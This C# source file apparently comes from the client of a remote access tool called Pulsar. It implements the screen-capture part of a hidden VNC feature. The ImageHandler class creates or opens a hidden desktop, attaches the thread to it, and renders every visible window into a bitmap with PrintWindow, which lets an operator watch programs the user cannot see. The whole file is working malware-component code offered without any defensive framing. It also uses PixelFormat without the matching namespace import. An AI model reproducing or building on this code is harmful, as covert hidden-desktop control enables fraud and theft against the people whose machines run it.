using System;
using System.Drawing;
using System.Runtime.InteropServices;

namespace Pulsar.Client.Helper.HVNC
{
    internal class ImageHandler
    {
        [DllImport("user32.dll", SetLastError = true)]
        private static extern IntPtr GetDC(IntPtr hWnd);

        [DllImport("user32.dll", SetLastError = true)]
        private static extern bool SetThreadDesktop(IntPtr hDesktop);

        [DllImport("user32.dll", SetLastError = true)]
        private static extern IntPtr OpenDesktop(string lpszDesktop, int dwFlags, bool fInherit, uint dwDesiredAccess);

        [DllImport("user32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
        private static extern IntPtr CreateDesktop(string lpszDesktop, IntPtr lpszDevice, IntPtr pDevmode, int dwFlags, uint dwDesiredAccess, IntPtr lpsa);

        [DllImport("user32.dll")]
        private static extern IntPtr GetDesktopWindow();

        [DllImport("user32.dll", SetLastError = true)]
        private static extern bool GetWindowRect(IntPtr hwnd, out RECT lpRect);

        [DllImport("user32.dll")]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool IsWindowVisible(IntPtr hWnd);

        [DllImport("user32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool PrintWindow(IntPtr hwnd, IntPtr hDC, uint nFlags);

        [DllImport("user32.dll", SetLastError = true)]
        private static extern IntPtr GetWindow(IntPtr hWnd, GetWindowType uCmd);

        [DllImport("user32.dll")]
        private static extern IntPtr GetTopWindow(IntPtr hWnd);

        [DllImport("user32.dll")]
        private static extern bool ReleaseDC(IntPtr hWnd, IntPtr hDC);

        [DllImport("gdi32.dll")]
        private static extern IntPtr CreateCompatibleDC(IntPtr hdc);

        [DllImport("gdi32.dll")]
        private static extern IntPtr CreateCompatibleBitmap(IntPtr hdc, int nWidth, int nHeight);

        [DllImport("gdi32.dll")]
        private static extern IntPtr SelectObject(IntPtr hdc, IntPtr hgdiobj);

        [DllImport("gdi32.dll")]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool DeleteObject(IntPtr hObject);

        [DllImport("gdi32.dll")]
        private static extern bool DeleteDC(IntPtr hdc);

        [DllImport("user32.dll", SetLastError = true)]
        private static extern bool CloseDesktop(IntPtr hDesktop);

        [DllImport("gdi32.dll")]
        private static extern int GetDeviceCaps(IntPtr hdc, int nIndex);

        private readonly float _scalingFactor;
        private Bitmap _reusableScreenshotBitmap;
        private object _bitmapLock = new object(); // For thread-safe access to _reusableScreenshotBitmap

        public ImageHandler(string DesktopName)
        {
            IntPtr intPtr = OpenDesktop(DesktopName, 0, true, 511U);
            if (intPtr == IntPtr.Zero)
            {
                intPtr = CreateDesktop(DesktopName, IntPtr.Zero, IntPtr.Zero, 0, 511U, IntPtr.Zero);
            }
            this.Desktop = intPtr;
            this._scalingFactor = CalculateScalingFactor();
            // Initialize _reusableScreenshotBitmap, potentially based on primary screen dimensions as a default
            // For now, it will be initialized on first use or if dimensions change in Screenshot()
        }

        private static float CalculateScalingFactor()
        {
            float result;
            using (Graphics graphics = Graphics.FromHwnd(IntPtr.Zero))
            {
                IntPtr hdc = graphics.GetHdc();
                int deviceCaps = GetDeviceCaps(hdc, 10);
                result = (float)GetDeviceCaps(hdc, 117) / (float)deviceCaps;
            }
            return result;
        }

        private float GetScalingFactor()
        {
            return _scalingFactor;
        }

        private bool DrawApplication(IntPtr hWnd, Graphics ModifiableScreen, IntPtr DC)
        {
            bool result = false;
            RECT rect;
            GetWindowRect(hWnd, out rect);
            float scalingFactor = _scalingFactor; // Use cached value
            IntPtr intPtr = CreateCompatibleDC(DC);
            IntPtr intPtr2 = CreateCompatibleBitmap(DC, (int)((float)(rect.Right - rect.Left) * scalingFactor), (int)((float)(rect.Bottom - rect.Top) * scalingFactor));
            SelectObject(intPtr, intPtr2);
            uint nFlags = 2U;
            if (PrintWindow(hWnd, intPtr, nFlags))
            {
                try
                {
                    Bitmap bitmap = Image.FromHbitmap(intPtr2);
                    ModifiableScreen.DrawImage(bitmap, new Point(rect.Left, rect.Top));
                    bitmap.Dispose();
                    result = true;
                }
                catch
                {
                }
            }
            DeleteObject(intPtr2);
            DeleteDC(intPtr);
            return result;
        }

        private void DrawTopDown(IntPtr owner, Graphics ModifiableScreen, IntPtr DC)
        {
            IntPtr intPtr = GetTopWindow(owner);
            if (intPtr == IntPtr.Zero)
            {
                return;
            }
            intPtr = GetWindow(intPtr, GetWindowType.GW_HWNDLAST);
            if (intPtr == IntPtr.Zero)
            {
                return;
            }
            while (intPtr != IntPtr.Zero)
            {
                this.DrawHwnd(intPtr, ModifiableScreen, DC);
                intPtr = GetWindow(intPtr, GetWindowType.GW_HWNDPREV);
            }
        }

        private void DrawHwnd(IntPtr hWnd, Graphics ModifiableScreen, IntPtr DC)
        {
            if (IsWindowVisible(hWnd))
            {
                this.DrawApplication(hWnd, ModifiableScreen, DC);
                if (Environment.OSVersion.Version.Major < 6)
                {
                    this.DrawTopDown(hWnd, ModifiableScreen, DC);
                }
            }
        }

        public void Dispose()
        {
            CloseDesktop(this.Desktop);
            lock (_bitmapLock)
            {
                _reusableScreenshotBitmap?.Dispose();
                _reusableScreenshotBitmap = null;
            }
            // GC.Collect(); // Removed
        }

        public Bitmap Screenshot()
        {
            SetThreadDesktop(this.Desktop);
            IntPtr dc = GetDC(IntPtr.Zero); // DC for the current thread's desktop
            RECT rect;
            GetWindowRect(GetDesktopWindow(), out rect); // Dimensions of the virtual desktop window

            float scalingFactor = this._scalingFactor;
            int targetWidth = (int)((float)rect.Right * scalingFactor);
            int targetHeight = (int)((float)rect.Bottom * scalingFactor);

            // Ensure target dimensions are valid
            if (targetWidth <= 0 || targetHeight <= 0)
            {
                ReleaseDC(IntPtr.Zero, dc);
                // Return a small dummy bitmap or throw an exception,
                // as 0-size bitmaps are invalid.
                // This case should ideally not happen if GetWindowRect provides valid dimensions.
                return new Bitmap(1, 1); // Fallback, though an error might be more appropriate
            }
            
            lock(_bitmapLock)
            {
                if (_reusableScreenshotBitmap == null || _reusableScreenshotBitmap.Width != targetWidth || _reusableScreenshotBitmap.Height != targetHeight)
                {
                    _reusableScreenshotBitmap?.Dispose();
                    _reusableScreenshotBitmap = new Bitmap(targetWidth, targetHeight, PixelFormat.Format32bppArgb); // Using a common pixel format
                }

                using (Graphics graphics = Graphics.FromImage(_reusableScreenshotBitmap))
                {
                    // Clear the bitmap with transparency to avoid artifacts from previous frame
                    graphics.Clear(Color.Transparent); 
                    // It's important that DrawTopDown correctly populates the full area,
                    // or use a fill if it only draws sparse windows.
                    // Assuming DrawTopDown renders the entire desktop content.

                    this.DrawTopDown(IntPtr.Zero, graphics, dc);
                }
                ReleaseDC(IntPtr.Zero, dc);
                // The caller (HVNCHandler.CaptureFrame) expects to own the Bitmap and dispose it.
                // So, we must return a clone.
                return (Bitmap)_reusableScreenshotBitmap.Clone();
            }
        }

        public IntPtr Desktop = IntPtr.Zero;

        private enum DESKTOP_ACCESS : uint
        {
            DESKTOP_NONE,
            DESKTOP_READOBJECTS,
            DESKTOP_CREATEWINDOW,
            DESKTOP_CREATEMENU = 4U,
            DESKTOP_HOOKCONTROL = 8U,
            DESKTOP_JOURNALRECORD = 16U,
            DESKTOP_JOURNALPLAYBACK = 32U,
            DESKTOP_ENUMERATE = 64U,
            DESKTOP_WRITEOBJECTS = 128U,
            DESKTOP_SWITCHDESKTOP = 256U,
            GENERIC_ALL = 511U
        }

        private struct RECT
        {
            public int Left;

            public int Top;

            public int Right;

            public int Bottom;
        }

        private enum GetWindowType : uint
        {
            GW_HWNDFIRST,
            GW_HWNDLAST,
            GW_HWNDNEXT,
            GW_HWNDPREV,
            GW_OWNER,
            GW_CHILD,
            GW_ENABLEDPOPUP
        }

        private enum DeviceCap
        {
            VERTRES = 10,
            DESKTOPVERTRES = 117
        }
    }
}
